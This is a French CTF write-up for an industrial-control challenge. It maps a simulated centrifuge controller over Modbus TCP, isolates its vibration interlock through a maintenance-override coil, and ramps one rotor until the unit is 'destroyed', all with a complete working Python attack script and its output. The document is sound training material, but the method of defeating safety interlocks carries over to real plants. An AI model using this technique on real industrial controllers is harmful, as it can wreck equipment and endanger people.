# Writeup — OT#007 · Centrifuge-Resonance

**Événement :** BUG|PWN / Cyber.industries OT CTF · Catégorie **OT** · Format `CTF{...}`
**Cible :** `169.58.126.107:6005` — Modbus TCP réel
**Flag :** `CTF{713a514d4bb87d6343f976fc56db961d}`

---

## 1. Contexte

Un contrôleur de cascade de centrifugeuses pilote deux rotors (A « lourd/lent », B « léger/rapide ») avec un **interlock de vibration** censé forcer un arrêt contrôlé avant que la vibration n'atteigne le seuil destructif. Objectif, façon **Stuxnet/Natanz** : détruire physiquement la cascade en poussant la vibration au-delà du seuil destructif *via le chemin de contrôle légitime*, puis récupérer le flag qui consigne l'incident.

Aucune source, aucune doc. Tout se découvre en scannant l'endpoint.

---

## 2. Reconnaissance — les pièges du transport

Avant même le Modbus « métier », le service a plusieurs comportements qu'il faut comprendre sous peine de tourner en rond :

| Comportement | Conséquence |
|---|---|
| **Rate-limit par IP sur les reconnexions** | Une rafale de nouvelles connexions TCP → `accept` puis `EOF` immédiat (~2×RTT). Se purge après ~60–180 s de silence. → **Tout faire sur UNE seule socket persistante.** |
| **FC2 (Read Discrete Inputs) ferme la socket** | Ne jamais utiliser FC2. FC1/FC3/FC4/FC5/FC6 sont OK. |
| **Une réponse d'exception (EXC) ne ferme PAS la socket** | On peut sonder les plages d'adresses sans risque (une lecture hors plage renvoie EXC 2). |
| **Une nouvelle connexion réinitialise l'état du simulateur** | Utile : un état « verrouillé » se réinitialise en reconnectant. |
| **Démarrage de l'instance ~1 min** | Pendant le boot : accept-then-drop. |

Cartographie (via recherche binaire sur les `count`, EXC = borne) :
- **10 coils**, **100 holding registers** (FC3), **100 input registers** (FC4). Tout à zéro au repos.

---

## 3. Modèle de contrôle

En actionnant coils et registres et en observant la télémétrie :

```
coil0  = POWER (alimentation)            input[0] = STATUS (champ de bits)
coil1  = MAINTENANCE OVERRIDE            input[2] = vitesse rotor A
coil2  = enable rotor B                  input[3] = vitesse rotor B
HR10   = consigne vitesse rotor A        input[4] = VIBRATION
HR11   = consigne vitesse rotor B        flag     = input[20..56]  (1 char ASCII / registre)
```

**`input[0]` est un champ de bits**, pas un énuméré :

```
bit0 (1) = running        bit1 (2) = interlock déclenché (arrêt contrôlé)
bit2 (4) = DÉTRUIT                        (3 = fault de consigne invalide)
```

Détails utiles :
- Les écritures FC6 dans les consignes **persistent** ; un pas de consigne trop grand (0 → 12000) lève un *fault* (status 3) → **rampe progressive**.
- Écrire une valeur hors plage dans HR12–23 lève aussi un fault.

---

## 4. La physique : la vibration vient du **différentiel**

Point clé découvert en corrélant les vitesses et la vibration :

```
vibration ≈ 0.055 × |vitesse_A − vitesse_B|
```

Preuves (deux rotors) : A1946/B3722→vib100, A3490/B6796→vib185, etc. ; et rotor B **seul** (A=0) → vibration maximale. Deux rotors synchronisés (différentiel ≈ 0) → vibration ≈ 0. C'est ce qui explique le rôle des « deux rotors » : la vibration destructrice naît de l'**écart de vitesse**, pas de la vitesse absolue.

L'interlock se déclenche quand la vibration atteint **~300** (soit un différentiel ≈ 5700).

---

## 5. L'interlock et son isolation

L'interlock est « réel et fonctionne » : sans override, atteindre vib ≈ 300 déclencherait l'arrêt contrôlé (`status` bit1 = 2). Le briefing le dit : *« maintenance override : même écriture de coil que POWER »* et *« isolation de l'interlock : même chemin d'accès »* — donc l'isolation se fait par une **écriture de coil**, exactement comme l'alimentation.

Avec le **maintenance override engagé (coil1)**, la vibration franchit le seuil sans arrêt contrôlé et passe directement en **DÉTRUIT (`status` bit2 = 4)**. À cet instant, le simulateur écrit le flag dans les input registers 20 à 56.

---

## 6. Exploitation

1. Une seule socket persistante.
2. `coil0 = 1` (power), `coil1 = 1` (maintenance override → interlock isolé), `coil2 = 1` (enable rotor B).
3. Rampe **progressive** de `HR11` (rotor B) en laissant `HR10` (rotor A) à 0 → différentiel maximal → vibration croît.
4. À vib ≈ 300, `status` passe à **4 (DÉTRUIT)**.
5. Lire `input[0..100]` et **décoder chaque registre comme un caractère ASCII** → flag.

Script autonome (socket brute, sans dépendance) :

```python
#!/usr/bin/env python3
import socket, struct, time

HOST, PORT = "169.58.126.107", 6005

class MB:
    def __init__(s):
        s.s = socket.create_connection((HOST, PORT), timeout=5)
        s.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1); s.t = 0
    def _txn(s, pdu):
        s.t = (s.t + 1) & 0xFFFF
        s.s.sendall(struct.pack(">HHHB", s.t, 0, len(pdu)+1, 1) + pdu)
        h = s._recv(7); n = struct.unpack(">H", h[4:6])[0]
        return s._recv(n-1)
    def _recv(s, n):
        b = b""
        while len(b) < n:
            d = s.s.recv(n-len(b))
            if not d: raise ConnectionError
            b += d
        return b
    def ir(s, a, c):                      # read input registers (FC4)
        p = s._txn(struct.pack(">BHH", 4, a, c)); raw = p[2:2+p[1]]
        return [struct.unpack(">H", raw[i:i+2])[0] for i in range(0, len(raw), 2)]
    def wc(s, a, v): s._txn(struct.pack(">BHH", 5, a, 0xFF00 if v else 0))
    def wr(s, a, v): s._txn(struct.pack(">BHH", 6, a, v & 0xFFFF))

m = MB()
m.wc(0, 1); m.wc(1, 1); m.wc(2, 1)        # power + maintenance override + enable B
time.sleep(0.4)
for sp in range(1500, 16001, 1500):       # rampe PROGRESSIVE de rotor B (A reste à 0)
    m.wr(11, sp)
    for _ in range(4):
        time.sleep(0.4); iv = m.ir(0, 100)
        if iv[0] & 4:                     # bit2 = DÉTRUIT
            flag = "".join(chr(v) for v in iv if 32 <= v < 127)
            i = flag.find("CTF{")
            print("CENTRIFUGE DÉTRUITE →", flag[i:flag.find('}', i)+1]); exit()
    print(f"HR11={sp:5d} spB={iv[3]:5d} vib={iv[4]:3d} status={iv[0]}")
```

Sortie :

```
HR11= 6000 spB=5663 vib=294 status=1
CENTRIFUGE DÉTRUITE → CTF{713a514d4bb87d6343f976fc56db961d}
```

---

## 7. Le piège (et mon erreur)

Le flag n'est **pas** empaqueté en octets : chaque input register contient **un code ASCII** (reg 20 = 67 = `C`, 21 = 84 = `T`, 22 = 70 = `F`, 23 = 123 = `{`, …).

Le décodage correct est `''.join(chr(v) for v in regs if 32 <= v < 127)`.

Un scanner qui empaquette chaque registre sur 2 octets (`struct.pack('>H', r)`) produit `C\x00T\x00F\x00{` — les octets nuls intercalés cassent toute regex `CTF\{`. C'est exactement l'erreur qui m'a fait tourner en rond : la centrifugeuse était détruite de nombreuses fois (`status=4`), mais (a) `status=4` était lu comme « interlock déclenché = échec » au lieu de « détruit = succès », et (b) le décodeur masquait le flag déjà présent dans les registres. Morale : **inspecter les octets/valeurs bruts avant de conclure « rien trouvé »**, surtout sur une cible où l'on attend un résultat.

---

**Flag : `CTF{713a514d4bb87d6343f976fc56db961d}`**
